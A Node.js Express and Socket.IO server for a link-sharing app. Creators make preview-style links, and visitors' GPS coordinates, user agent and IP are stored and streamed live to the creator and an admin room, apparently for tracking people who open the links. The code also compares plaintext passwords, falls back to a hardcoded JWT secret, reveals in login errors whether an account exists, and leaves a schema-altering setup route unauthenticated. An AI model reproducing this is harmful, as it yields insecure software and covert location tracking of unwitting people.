const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const path = require('path');
const cookieParser = require('cookie-parser');
const dotenv = require('dotenv');

// Load env vars
dotenv.config();

// Models
let sequelize, User, Link, Session;
try {
    ({ sequelize, User, Link, Session } = require('./models'));
} catch (e) {
    console.error('CRITICAL: Failed to load models/DB:', e);
}

const app = express();
const PORT = process.env.PORT || 3001;
const SECRET_KEY = process.env.JWT_SECRET || 'super-secret-key-change-in-prod';

// Middleware
app.use(cors({
    origin: process.env.CLIENT_URL || true, // Allow all or specific
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
}));
app.use(express.json());
app.use(cookieParser());

// Server Setup
const server = http.createServer(app);

// Socket.IO Setup (Wrapped for safety)
let io;
try {
    io = new Server(server, {
        cors: {
            origin: "*",
            methods: ["GET", "POST"]
        }
    });

    io.on('connection', (socket) => {
        console.log('Client connected:', socket.id);

        socket.on('join-admin', () => {
            socket.join('admin-room');
        });

        socket.on('update-location', async ({ linkId, lat, lng, userAgent }) => {
            try {
                const sessionsData = {
                    socketId: socket.id,
                    linkId,
                    lat,
                    lng,
                    userAgent,
                    ip: socket.handshake.address
                };
                const createdSession = await Session.create(sessionsData);
                io.to('admin-room').emit('location-updated', createdSession);
            } catch (error) {
                console.error('Error saving session:', error);
            }
        });

        socket.on('disconnect', () => {
            io.to('admin-room').emit('client-disconnected', socket.id);
        });
    });
} catch (e) {
    console.warn('Socket.IO failed to initialize (expected in serverless):', e);
    // Mock io to prevent crashes in routes
    io = { to: () => ({ emit: () => { } }), emit: () => { } };
}

// Auth Middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (token == null) return res.sendStatus(401);

    jwt.verify(token, SECRET_KEY, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

// --- ROUTES ---

// Simple Ping (No DB)
app.get('/api/ping', (req, res) => {
    res.json({ message: 'pong', timestamp: new Date().toISOString(), env: process.env.NODE_ENV });
});

// Login
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    try {
        if (!User) {
            throw new Error('Database models not loaded. Check server logs.');
        }

        const user = await User.findOne({ where: { email } });
        if (user && user.password === password) {
            if (!user.isActive) return res.status(403).json({ message: 'Cuenta desactivada' });

            const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, SECRET_KEY, { expiresIn: '24h' });
            res.json({ token, role: user.role });
        } else {
            console.log(`Login failed for ${email}`);
            res.status(401).json({
                message: `Credenciales inválidas (Debug: User=${!!user})`
            });
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Error interno: ' + error.message });
    }
});

// Create Link
app.post('/api/links', authenticateToken, async (req, res) => {
    const { title, description, imageUrl, destinationUrl, buttonText } = req.body;
    try {
        const newLink = await Link.create({
            id: Math.random().toString(36).substr(2, 9),
            title, description, imageUrl, destinationUrl, buttonText,
            createdBy: req.user.id
        });
        res.json(newLink);
    } catch (error) {
        console.error('Error creando enlace:', error);
        res.status(500).json({ message: 'Error creando enlace: ' + error.message });
    }
});

// Get Link Public
app.get('/api/links/:id', async (req, res) => {
    try {
        const link = await Link.findByPk(req.params.id);
        if (link) res.json(link);
        else res.status(404).json({ message: 'Enlace no encontrado' });
    } catch (error) {
        res.status(500).json({ message: 'Error recuperando enlace' });
    }
});

// Get All Links (Admin)
app.get('/api/admin/links', authenticateToken, async (req, res) => {
    if (req.user.role !== 'admin') return res.sendStatus(403);
    try {
        const links = await Link.findAll({ include: User });
        res.json(links);
    } catch (error) {
        res.status(500).json({ message: 'Error' });
    }
});

// Get User Links
app.get('/api/user/links', authenticateToken, async (req, res) => {
    try {
        const links = await Link.findAll({ where: { createdBy: req.user.id } });
        res.json(links);
    } catch (error) {
        res.status(500).json({ message: 'Error' });
    }
});

// Get User Stats
app.get('/api/user/stats', authenticateToken, async (req, res) => {
    try {
        const links = await Link.findAll({ where: { createdBy: req.user.id } });
        const totalLinks = links.length;
        const linkIds = links.map(l => l.id);
        const totalLocations = await Session.count({ where: { linkId: linkIds } });

        res.json({ totalLinks, totalLocations });
    } catch (error) {
        console.error('Stats error:', error);
        res.status(500).json({ message: 'Error recuperando estadísticas' });
    }
});

// Get User Sessions
app.get('/api/user/sessions', authenticateToken, async (req, res) => {
    try {
        const links = await Link.findAll({ where: { createdBy: req.user.id }, attributes: ['id'] });
        const linkIds = links.map(l => l.id);

        const sessions = await Session.findAll({
            where: { linkId: linkIds },
            order: [['timestamp', 'DESC']],
            limit: 50 // Limit for performance
        });
        res.json(sessions);
    } catch (error) {
        console.error('Sessions error:', error);
        res.status(500).json({ message: 'Error recuperando sesiones' });
    }
});

// Health Check
app.get('/api/health', async (req, res) => {
    try {
        await sequelize.authenticate();
        res.json({ status: 'online', database: 'connected' });
    } catch (error) {
        res.status(500).json({ status: 'error', error: error.message });
    }
});

// Setup DB
app.get('/api/setup-db', async (req, res) => {
    try {
        await sequelize.sync({ alter: true });
        // Seed logic here if needed, kept simple for brevity
        res.json({ message: 'Database synced' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Initialize DB and Server (Only for local dev)
if (require.main === module) {
    sequelize.sync({ alter: true }).then(() => {
        server.listen(PORT, () => {
            console.log(`Server running on http://localhost:${PORT}`);
        });
    }).catch(err => {
        console.error('Unable to connect to the database:', err);
    });
}

module.exports = app;
